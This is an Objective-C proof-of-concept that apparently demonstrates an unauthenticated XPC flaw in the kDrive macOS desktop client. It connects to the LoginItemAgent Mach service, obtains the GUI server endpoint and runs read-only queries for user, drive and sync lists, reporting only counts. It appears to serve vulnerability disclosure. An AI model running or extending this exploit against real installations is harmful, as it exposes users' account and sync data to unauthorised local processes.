#import <Foundation/Foundation.h>

typedef NS_ENUM(NSInteger, ProcessType) {
    extServer = 0,
    guiServer = 1,
    client = 2,
    finderExt = 3
};

@protocol XPCLoginItemProtocol
- (void)setServerExtEndpoint:(NSXPCListenerEndpoint *)endPoint;
- (void)serverExtEndpoint:(void (^)(NSXPCListenerEndpoint *))callback;
- (void)setServerGuiEndpoint:(NSXPCListenerEndpoint *)endPoint;
- (void)serverGuiEndpoint:(void (^)(NSXPCListenerEndpoint *))callback;
@end

@protocol XPCLoginItemRemoteProtocol
- (void)processType:(void (^)(ProcessType))callback;
- (void)serverIsRunning:(NSXPCListenerEndpoint *)endPoint;
@end

@protocol XPCGuiProtocol
- (void)processQuery:(NSData *)query callback:(void (^)(NSData *answer))callback;
@end

@protocol XPCGuiRemoteProtocol
- (void)processSignal:(NSData *)msg;
@end

@interface ProbePeer : NSObject <XPCLoginItemRemoteProtocol, XPCGuiRemoteProtocol>
@end

@implementation ProbePeer
- (void)processType:(void (^)(ProcessType))callback {
    // Deliberately return an unrecognized role so the LoginItemAgent's switch
    // does not replace any legitimate GUI/Finder/server connection mapping.
    callback((ProcessType)99);
}

- (void)serverIsRunning:(NSXPCListenerEndpoint *)endPoint {
    (void)endPoint;
}

- (void)processSignal:(NSData *)msg {
    (void)msg;
}
@end

static BOOL waitSemaphore(dispatch_semaphore_t sem, NSTimeInterval seconds) {
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(seconds * NSEC_PER_SEC));
    return dispatch_semaphore_wait(sem, deadline) == 0;
}

static BOOL sendReadOnlyQuery(NSXPCConnection *connection, NSInteger requestNum, NSString *label, NSString *resultKey) {
    NSDictionary *request = @{
        @"id": @1,
        @"num": @(requestNum),
        @"params": @{}
    };

    NSError *jsonError = nil;
    NSData *requestData = [NSJSONSerialization dataWithJSONObject:request options:0 error:&jsonError];
    if (!requestData) {
        fprintf(stderr, "[FAIL] %s request JSON serialization failed: %s\n",
                label.UTF8String, jsonError.localizedDescription.UTF8String);
        return NO;
    }

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL success = NO;
    __block BOOL callbackReceived = NO;

    id<XPCGuiProtocol> proxy = [connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
        fprintf(stderr, "[FAIL] %s XPC error: %s\n", label.UTF8String, error.localizedDescription.UTF8String);
        dispatch_semaphore_signal(sem);
    }];

    [proxy processQuery:requestData callback:^(NSData *answer) {
        callbackReceived = YES;
        NSError *parseError = nil;
        id parsed = [NSJSONSerialization JSONObjectWithData:answer options:0 error:&parseError];
        if (![parsed isKindOfClass:[NSDictionary class]]) {
            fprintf(stderr, "[FAIL] %s returned non-JSON/non-dictionary data: %s\n",
                    label.UTF8String,
                    parseError ? parseError.localizedDescription.UTF8String : "unknown parse error");
            dispatch_semaphore_signal(sem);
            return;
        }

        NSDictionary *response = (NSDictionary *)parsed;
        NSNumber *code = response[@"code"];
        NSNumber *cause = response[@"cause"];
        NSDictionary *params = [response[@"params"] isKindOfClass:[NSDictionary class]] ? response[@"params"] : @{};
        id result = params[resultKey];
        NSUInteger count = [result respondsToSelector:@selector(count)] ? (NSUInteger)[result count] : 0;

        // Do not print names, paths, node IDs, drive IDs, or any other account data.
        printf("[RESULT] %s code=%ld cause=%ld %s_count=%lu\n",
               label.UTF8String,
               (long)code.integerValue,
               (long)cause.integerValue,
               resultKey.UTF8String,
               (unsigned long)count);

        success = (code != nil && code.integerValue == 0);
        dispatch_semaphore_signal(sem);
    }];

    if (!waitSemaphore(sem, 10.0)) {
        fprintf(stderr, "[FAIL] %s timed out waiting for callback\n", label.UTF8String);
        return NO;
    }

    if (!callbackReceived) {
        return NO;
    }
    return success;
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        (void)argc;
        (void)argv;

        NSString *machService = @"864VDCS2QY.com.infomaniak.drive.desktopclient.LoginItemAgent";
        printf("[INFO] Connecting to kDrive LoginItemAgent Mach service\n");

        ProbePeer *peer = [ProbePeer new];
        NSXPCConnection *loginConnection = [[NSXPCConnection alloc] initWithMachServiceName:machService options:0];
        loginConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCLoginItemRemoteProtocol)];
        loginConnection.exportedObject = peer;
        loginConnection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCLoginItemProtocol)];

        dispatch_semaphore_t endpointSem = dispatch_semaphore_create(0);
        __block NSXPCListenerEndpoint *guiEndpoint = nil;
        __block BOOL loginXpcError = NO;

        loginConnection.interruptionHandler = ^{
            fprintf(stderr, "[WARN] LoginItemAgent connection interrupted\n");
        };
        loginConnection.invalidationHandler = ^{
            fprintf(stderr, "[WARN] LoginItemAgent connection invalidated\n");
        };
        [loginConnection resume];

        id<XPCLoginItemProtocol> loginProxy = [loginConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
            loginXpcError = YES;
            fprintf(stderr, "[FAIL] LoginItemAgent XPC error: %s\n", error.localizedDescription.UTF8String);
            dispatch_semaphore_signal(endpointSem);
        }];

        [loginProxy serverGuiEndpoint:^(NSXPCListenerEndpoint *endpoint) {
            guiEndpoint = endpoint;
            dispatch_semaphore_signal(endpointSem);
        }];

        if (!waitSemaphore(endpointSem, 10.0)) {
            fprintf(stderr, "[FAIL] Timed out waiting for serverGuiEndpoint\n");
            [loginConnection invalidate];
            return 2;
        }
        if (loginXpcError || guiEndpoint == nil) {
            fprintf(stderr, "[FAIL] Did not receive kDrive GUI server endpoint\n");
            [loginConnection invalidate];
            return 3;
        }

        printf("[SECURITY_SIGNAL] UNAUTHENTICATED_LOGINITEMAGENT_RETURNED_GUI_ENDPOINT=true\n");

        NSXPCConnection *guiConnection = [[NSXPCConnection alloc] initWithListenerEndpoint:guiEndpoint];
        guiConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCGuiRemoteProtocol)];
        guiConnection.exportedObject = peer;
        guiConnection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCGuiProtocol)];
        guiConnection.interruptionHandler = ^{
            fprintf(stderr, "[WARN] GUI endpoint connection interrupted\n");
        };
        guiConnection.invalidationHandler = ^{
            fprintf(stderr, "[WARN] GUI endpoint connection invalidated\n");
        };
        [guiConnection resume];

        // RequestNum values from released kDrive 3.8.6 src/libcommon/comm.h:
        // USER_DBIDLIST=2, DRIVE_INFOLIST=7, SYNC_INFOLIST=11.
        BOOL userOK = sendReadOnlyQuery(guiConnection, 2, @"USER_DBIDLIST", @"userDbIdList");
        BOOL driveOK = sendReadOnlyQuery(guiConnection, 7, @"DRIVE_INFOLIST", @"driveInfoList");
        BOOL syncOK = sendReadOnlyQuery(guiConnection, 11, @"SYNC_INFOLIST", @"syncInfoList");

        [guiConnection invalidate];
        [loginConnection invalidate];

        if (userOK && driveOK && syncOK) {
            printf("[SECURITY_SIGNAL] UNAUTHENTICATED_GUI_READ_QUERIES_SUCCEEDED=true\n");
            printf("[INFO] Read-only confirmation complete. No cloud mutation was attempted.\n");
            return 0;
        }

        fprintf(stderr, "[FAIL] One or more read-only GUI queries failed\n");
        return 4;
    }
}
